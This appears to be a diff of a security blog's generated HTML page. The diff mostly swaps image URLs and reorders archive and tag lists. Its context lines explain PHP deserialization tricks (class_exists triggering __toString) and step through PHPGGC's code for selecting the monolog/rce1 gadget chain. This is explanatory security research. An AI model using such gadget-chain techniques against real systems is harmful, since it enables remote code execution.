 <h4 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h4><p>从<code>in_array()</code>方法中，我们又有了拓展性的想法。我们都知道，在php底层，类似于<code>in_array()</code>这类函数，都属于先执行，之后返回判断结果。那么顺着这个想法，我想到了去年的<a href="http://paper.seebug.org/11/" target="_blank" rel="noopener">IPS Community Suite &lt;= 4.1.12.3 Autoloaded PHP远程代码执行漏洞</a>，这个漏洞中有一个非常有意思的触发点，就是通过<code>class_exists</code>造成相关类的调用，从而触发漏洞。</p>
 <p>通过测试，我们发现了，如果将反序列化后的对象带入<code>class_exists()</code>方法中，同样会造成<code>__toString</code>的执行：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-15001897871207.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15001897871207.jpg" alt=""></p>
 <h2 id="2-猜想——对象处理过程可能出现的威胁"><a href="#2-猜想——对象处理过程可能出现的威胁" class="headerlink" title="2. 猜想——对象处理过程可能出现的威胁"></a>2. 猜想——对象处理过程可能出现的威胁</h2><p>通过<code>class_exists</code>可能触发的危险操作，继续向下想一下，是否在对象处理过程中也有可能存在漏洞呢？</p>
 <p>还记的去年爆出了一个<a href="https://bugs.php.net/bug.php?id=72433" target="_blank" rel="noopener">PHP GC算法和反序列化机制释放后重用漏洞</a>，是垃圾回收机制本身所出现的问题，在释放与重用的过程中存在的问题。</p>
 <p>顺着这个思路，大家可以继续在对象创建、对象执行、对象销毁方面进行深入的研究。</p>
@@ -768,7 +768,7 @@ height:50vh;
 <p>当前的<code>$class</code>为<code>monolog/rce1</code>，看到接下来进入了<code>get_gadget_chain</code>方法中，带着我们参数跟进去看。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_gadget_chain</span><span class="params">($class)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $full = strtolower(<span class="string">'GadgetChain/'</span> . $class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($full, array_keys(<span class="keyword">$this</span>-&gt;gadgets)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>(<span class="string">'Unknown gadget chain: '</span> . $class);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;gadgets[$full];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>现在的<code>$full</code>为<code>gadgetchain/monolog/rce1</code>，ok，看一下我们全局存储的具有payload的数组：</p>
-<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14998544938101.jpg" alt=""></p>
+<p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14998544938101.jpg" alt=""></p>
 <p>可以很清楚的看到，返回了一个已经实例化完成的<code>GadgetChain\Monolog\RCE1</code>的类。对应的目录则为<code>/gadgetchains/Monolog/RCE/1/chain.php</code></p>
 <p>继续向下，看到将类与参数传入了<code>get_type_parameters</code>，跟进：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">get_type_parameters</span><span class="params">($gc, $parameters)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $arguments = $gc-&gt;parameters;</span><br><span class="line"></span><br><span class="line">        $values = @array_combine($arguments, $parameters);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($values === <span class="keyword">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;o($gc, <span class="number">2</span>);</span><br><span class="line">            $arguments = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($a)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">'&lt;'</span> . $a . <span class="string">'&gt;'</span>;</span><br><span class="line">            &#125;, $arguments);</span><br><span class="line">            $message = <span class="string">'Invalid arguments for type "'</span> . $gc-&gt;type . <span class="string">'" '</span> . <span class="string">"\n"</span> .</span><br><span class="line">                       <span class="keyword">$this</span>-&gt;_get_command_line($gc-&gt;get_name(), ...$arguments);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> PHPGGC\<span class="keyword">Exception</span>($message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $values;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
@@ -1203,6 +1203,64 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 21
@@ -1222,6 +1280,11 @@ top:50vh;
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）/" >JBoss RichFaces Unserialize+EL=RCE Analysis（CVE-2018-14667）</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1341,19 +1404,10 @@ top:50vh;
             <span class="archive-post-date">08/09</span><a class="archive-post-title" href= "/2016/08/09/IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）/" >IPS Community Suite 自动加载的PHP代码注入漏洞（CVE-2016-6174）</a>
         </li>
     
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2016/07/01/Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）/" >Discuz 3.2 利用ssrf+缓存应用getshell漏洞（附pocsuite）</a>
-        </li>
-    
     </div>
   </div>
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
-    
-        <span class="sidebar-tag-name" data-tags="黑产研究"><span class="iconfont-archer">&#xe606;</span>黑产研究</span>
-    
-        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
@@ -1363,19 +1417,25 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="环境部署"><span class="iconfont-archer">&#xe606;</span>环境部署</span>
     
-        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
-    
-        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
-    
-        <span class="sidebar-tag-name" data-tags="CookBook"><span class="iconfont-archer">&#xe606;</span>CookBook</span>
-    
-        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
-    
         <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="blockchain"><span class="iconfont-archer">&#xe606;</span>blockchain</span>
     
+        <span class="sidebar-tag-name" data-tags="黑产研究"><span class="iconfont-archer">&#xe606;</span>黑产研究</span>
+    
         <span class="sidebar-tag-name" data-tags="薅羊毛"><span class="iconfont-archer">&#xe606;</span>薅羊毛</span>
+    
+        <span class="sidebar-tag-name" data-tags="BlackHat SEO"><span class="iconfont-archer">&#xe606;</span>BlackHat SEO</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全研究"><span class="iconfont-archer">&#xe606;</span>安全研究</span>
+    
+        <span class="sidebar-tag-name" data-tags="Joomla"><span class="iconfont-archer">&#xe606;</span>Joomla</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="CookBook"><span class="iconfont-archer">&#xe606;</span>CookBook</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -1410,19 +1470,19 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="黑产研究"><span class="iconfont-archer">&#xe60a;</span>黑产研究</span>
-    
         <span class="sidebar-category-name" data-categories="漏洞分析"><span class="iconfont-archer">&#xe60a;</span>漏洞分析</span>
     
         <span class="sidebar-category-name" data-categories="环境部署"><span class="iconfont-archer">&#xe60a;</span>环境部署</span>
     
-        <span class="sidebar-category-name" data-categories="安全研究"><span class="iconfont-archer">&#xe60a;</span>安全研究</span>
-    
-        <span class="sidebar-category-name" data-categories="技术总结"><span class="iconfont-archer">&#xe60a;</span>技术总结</span>
-    
         <span class="sidebar-category-name" data-categories="一些思路"><span class="iconfont-archer">&#xe60a;</span>一些思路</span>
     
         <span class="sidebar-category-name" data-categories="blockchain"><span class="iconfont-archer">&#xe60a;</span>blockchain</span>
+    
+        <span class="sidebar-category-name" data-categories="黑产研究"><span class="iconfont-archer">&#xe60a;</span>黑产研究</span>
+    
+        <span class="sidebar-category-name" data-categories="安全研究"><span class="iconfont-archer">&#xe60a;</span>安全研究</span>
+    
+        <span class="sidebar-category-name" data-categories="技术总结"><span class="iconfont-archer">&#xe60a;</span>技术总结</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
